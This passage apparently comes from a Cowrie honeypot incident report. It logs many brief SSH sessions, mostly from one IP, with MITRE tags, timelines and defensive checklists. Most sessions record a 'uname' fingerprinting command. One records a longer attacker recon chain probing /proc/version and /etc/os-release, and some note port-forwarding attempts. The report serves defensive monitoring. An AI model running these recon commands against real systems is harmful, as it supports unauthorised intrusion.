| `2026-08-23 12:50:10` | `cowrie.login.success` |
| `2026-08-23 12:50:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.177.240[.]182` to AbuseIPDB if not already reported
- [ ] Block `83.177.240[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6005ebbaf37

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:12` | `cowrie.session.connect` |
| `2026-08-23 12:50:12` | `cowrie.client.version` |
| `2026-08-23 12:50:12` | `cowrie.client.kex` |
| `2026-08-23 12:50:12` | `cowrie.login.success` |
| `2026-08-23 12:50:13` | `cowrie.session.params` |
| `2026-08-23 12:50:13` | `cowrie.command.input` |
| `2026-08-23 12:50:13` | `cowrie.log.closed` |
| `2026-08-23 12:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd314877ba85

| Field | Detail |
|---|---|
| **Source IP** | `65.20.143[.]19` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:15` | `cowrie.session.connect` |
| `2026-08-23 12:50:16` | `cowrie.client.version` |
| `2026-08-23 12:50:16` | `cowrie.client.kex` |
| `2026-08-23 12:50:17` | `cowrie.login.success` |
| `2026-08-23 12:50:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.143[.]19` to AbuseIPDB if not already reported
- [ ] Block `65.20.143[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b20acb032d0b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:17` | `cowrie.session.connect` |
| `2026-08-23 12:50:17` | `cowrie.client.version` |
| `2026-08-23 12:50:17` | `cowrie.client.kex` |
| `2026-08-23 12:50:17` | `cowrie.login.success` |
| `2026-08-23 12:50:18` | `cowrie.session.params` |
| `2026-08-23 12:50:18` | `cowrie.command.input` |
| `2026-08-23 12:50:18` | `cowrie.log.closed` |
| `2026-08-23 12:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db2512cb16b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:22` | `cowrie.session.connect` |
| `2026-08-23 12:50:22` | `cowrie.client.version` |
| `2026-08-23 12:50:22` | `cowrie.client.kex` |
| `2026-08-23 12:50:22` | `cowrie.login.success` |
| `2026-08-23 12:50:23` | `cowrie.session.params` |
| `2026-08-23 12:50:23` | `cowrie.command.input` |
| `2026-08-23 12:50:23` | `cowrie.log.closed` |
| `2026-08-23 12:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe39485353f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:27` | `cowrie.session.connect` |
| `2026-08-23 12:50:27` | `cowrie.client.version` |
| `2026-08-23 12:50:28` | `cowrie.client.kex` |
| `2026-08-23 12:50:28` | `cowrie.login.success` |
| `2026-08-23 12:50:29` | `cowrie.session.params` |
| `2026-08-23 12:50:29` | `cowrie.command.input` |
| `2026-08-23 12:50:29` | `cowrie.log.closed` |
| `2026-08-23 12:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b934fcaa914

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:32` | `cowrie.session.connect` |
| `2026-08-23 12:50:32` | `cowrie.client.version` |
| `2026-08-23 12:50:32` | `cowrie.client.kex` |
| `2026-08-23 12:50:33` | `cowrie.login.success` |
| `2026-08-23 12:50:34` | `cowrie.session.params` |
| `2026-08-23 12:50:34` | `cowrie.command.input` |
| `2026-08-23 12:50:34` | `cowrie.log.closed` |
| `2026-08-23 12:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90a59466ad03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:37` | `cowrie.session.connect` |
| `2026-08-23 12:50:37` | `cowrie.client.version` |
| `2026-08-23 12:50:37` | `cowrie.client.kex` |
| `2026-08-23 12:50:38` | `cowrie.login.success` |
| `2026-08-23 12:50:39` | `cowrie.session.params` |
| `2026-08-23 12:50:39` | `cowrie.command.input` |
| `2026-08-23 12:50:39` | `cowrie.log.closed` |
| `2026-08-23 12:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4efcf23835d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:42` | `cowrie.session.connect` |
| `2026-08-23 12:50:42` | `cowrie.client.version` |
| `2026-08-23 12:50:43` | `cowrie.client.kex` |
| `2026-08-23 12:50:43` | `cowrie.login.success` |
| `2026-08-23 12:50:44` | `cowrie.session.params` |
| `2026-08-23 12:50:44` | `cowrie.command.input` |
| `2026-08-23 12:50:44` | `cowrie.log.closed` |
| `2026-08-23 12:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0dbf0434839

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:48` | `cowrie.session.connect` |
| `2026-08-23 12:50:48` | `cowrie.client.version` |
| `2026-08-23 12:50:48` | `cowrie.client.kex` |
| `2026-08-23 12:50:48` | `cowrie.login.success` |
| `2026-08-23 12:50:49` | `cowrie.session.params` |
| `2026-08-23 12:50:49` | `cowrie.command.input` |
| `2026-08-23 12:50:49` | `cowrie.log.closed` |
| `2026-08-23 12:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84b7b662f67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:53` | `cowrie.session.connect` |
| `2026-08-23 12:50:53` | `cowrie.client.version` |
| `2026-08-23 12:50:53` | `cowrie.client.kex` |
| `2026-08-23 12:50:53` | `cowrie.login.success` |
| `2026-08-23 12:50:54` | `cowrie.session.params` |
| `2026-08-23 12:50:54` | `cowrie.command.input` |
| `2026-08-23 12:50:54` | `cowrie.log.closed` |
| `2026-08-23 12:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057119fba017

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:50 |
| **Last Seen** | 2026-08-23 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:50:58` | `cowrie.session.connect` |
| `2026-08-23 12:50:58` | `cowrie.client.version` |
| `2026-08-23 12:50:58` | `cowrie.client.kex` |
| `2026-08-23 12:50:58` | `cowrie.login.success` |
| `2026-08-23 12:50:59` | `cowrie.session.params` |
| `2026-08-23 12:50:59` | `cowrie.command.input` |
| `2026-08-23 12:50:59` | `cowrie.log.closed` |
| `2026-08-23 12:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6770ff7cf388

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:00` | `cowrie.session.connect` |
| `2026-08-23 12:51:00` | `cowrie.client.version` |
| `2026-08-23 12:51:00` | `cowrie.client.kex` |
| `2026-08-23 12:51:01` | `cowrie.login.success` |
| `2026-08-23 12:51:02` | `cowrie.session.params` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.success` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.command.input` |
| `2026-08-23 12:51:02` | `cowrie.log.closed` |
| `2026-08-23 12:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6bf47f6d89

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:03` | `cowrie.session.connect` |
| `2026-08-23 12:51:03` | `cowrie.client.version` |
| `2026-08-23 12:51:03` | `cowrie.client.kex` |
| `2026-08-23 12:51:03` | `cowrie.login.success` |
| `2026-08-23 12:51:04` | `cowrie.session.params` |
| `2026-08-23 12:51:04` | `cowrie.command.input` |
| `2026-08-23 12:51:04` | `cowrie.log.closed` |
| `2026-08-23 12:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b07c0e2f682

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:08` | `cowrie.session.connect` |
| `2026-08-23 12:51:08` | `cowrie.client.version` |
| `2026-08-23 12:51:08` | `cowrie.client.kex` |
| `2026-08-23 12:51:08` | `cowrie.login.success` |
| `2026-08-23 12:51:09` | `cowrie.session.params` |
| `2026-08-23 12:51:09` | `cowrie.command.input` |
| `2026-08-23 12:51:09` | `cowrie.log.closed` |
| `2026-08-23 12:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f959a2df738c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:13` | `cowrie.session.connect` |
| `2026-08-23 12:51:13` | `cowrie.client.version` |
| `2026-08-23 12:51:13` | `cowrie.client.kex` |
| `2026-08-23 12:51:13` | `cowrie.login.success` |
| `2026-08-23 12:51:14` | `cowrie.session.params` |
| `2026-08-23 12:51:14` | `cowrie.command.input` |
| `2026-08-23 12:51:14` | `cowrie.log.closed` |
| `2026-08-23 12:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bed6a2dc721

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:18` | `cowrie.session.connect` |
| `2026-08-23 12:51:18` | `cowrie.client.version` |
| `2026-08-23 12:51:18` | `cowrie.client.kex` |
| `2026-08-23 12:51:19` | `cowrie.login.success` |
| `2026-08-23 12:51:19` | `cowrie.session.params` |
| `2026-08-23 12:51:19` | `cowrie.command.input` |
| `2026-08-23 12:51:20` | `cowrie.log.closed` |
| `2026-08-23 12:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-000bdaa9aa7f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:23` | `cowrie.session.connect` |
| `2026-08-23 12:51:23` | `cowrie.client.version` |
| `2026-08-23 12:51:23` | `cowrie.client.kex` |
| `2026-08-23 12:51:24` | `cowrie.login.success` |
| `2026-08-23 12:51:24` | `cowrie.session.params` |
| `2026-08-23 12:51:24` | `cowrie.command.input` |
| `2026-08-23 12:51:24` | `cowrie.log.closed` |
| `2026-08-23 12:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2da0a1752e7a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:28` | `cowrie.session.connect` |
| `2026-08-23 12:51:28` | `cowrie.client.version` |
| `2026-08-23 12:51:28` | `cowrie.client.kex` |
| `2026-08-23 12:51:29` | `cowrie.login.success` |
| `2026-08-23 12:51:29` | `cowrie.session.params` |
| `2026-08-23 12:51:29` | `cowrie.command.input` |
| `2026-08-23 12:51:30` | `cowrie.log.closed` |
| `2026-08-23 12:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02964e170fb7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:33` | `cowrie.session.connect` |
| `2026-08-23 12:51:33` | `cowrie.client.version` |
| `2026-08-23 12:51:33` | `cowrie.client.kex` |
| `2026-08-23 12:51:33` | `cowrie.login.success` |
| `2026-08-23 12:51:34` | `cowrie.session.params` |
| `2026-08-23 12:51:34` | `cowrie.command.input` |
| `2026-08-23 12:51:34` | `cowrie.log.closed` |
| `2026-08-23 12:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4514eb27dfc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:38` | `cowrie.session.connect` |
| `2026-08-23 12:51:38` | `cowrie.client.version` |
| `2026-08-23 12:51:38` | `cowrie.client.kex` |
| `2026-08-23 12:51:39` | `cowrie.login.success` |
| `2026-08-23 12:51:39` | `cowrie.session.params` |
| `2026-08-23 12:51:39` | `cowrie.command.input` |
| `2026-08-23 12:51:39` | `cowrie.log.closed` |
| `2026-08-23 12:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b12640c2b74

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:43` | `cowrie.session.connect` |
| `2026-08-23 12:51:43` | `cowrie.client.version` |
| `2026-08-23 12:51:43` | `cowrie.client.kex` |
| `2026-08-23 12:51:44` | `cowrie.login.success` |
| `2026-08-23 12:51:44` | `cowrie.session.params` |
| `2026-08-23 12:51:44` | `cowrie.command.input` |
| `2026-08-23 12:51:45` | `cowrie.log.closed` |
| `2026-08-23 12:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c49187f970

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:48` | `cowrie.session.connect` |
| `2026-08-23 12:51:48` | `cowrie.client.version` |
| `2026-08-23 12:51:49` | `cowrie.client.kex` |
| `2026-08-23 12:51:49` | `cowrie.login.success` |
| `2026-08-23 12:51:50` | `cowrie.session.params` |
| `2026-08-23 12:51:50` | `cowrie.command.input` |
| `2026-08-23 12:51:50` | `cowrie.log.closed` |
| `2026-08-23 12:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc25f92a44c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:53` | `cowrie.session.connect` |
| `2026-08-23 12:51:53` | `cowrie.client.version` |
| `2026-08-23 12:51:54` | `cowrie.client.kex` |
| `2026-08-23 12:51:54` | `cowrie.login.success` |
| `2026-08-23 12:51:55` | `cowrie.session.params` |
| `2026-08-23 12:51:55` | `cowrie.command.input` |
| `2026-08-23 12:51:55` | `cowrie.log.closed` |
| `2026-08-23 12:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83c72511eaf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:51 |
| **Last Seen** | 2026-08-23 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:51:59` | `cowrie.session.connect` |
| `2026-08-23 12:51:59` | `cowrie.client.version` |
| `2026-08-23 12:51:59` | `cowrie.client.kex` |
| `2026-08-23 12:51:59` | `cowrie.login.success` |
| `2026-08-23 12:52:00` | `cowrie.session.params` |
| `2026-08-23 12:52:00` | `cowrie.command.input` |
| `2026-08-23 12:52:00` | `cowrie.log.closed` |
| `2026-08-23 12:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d159ad3121d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
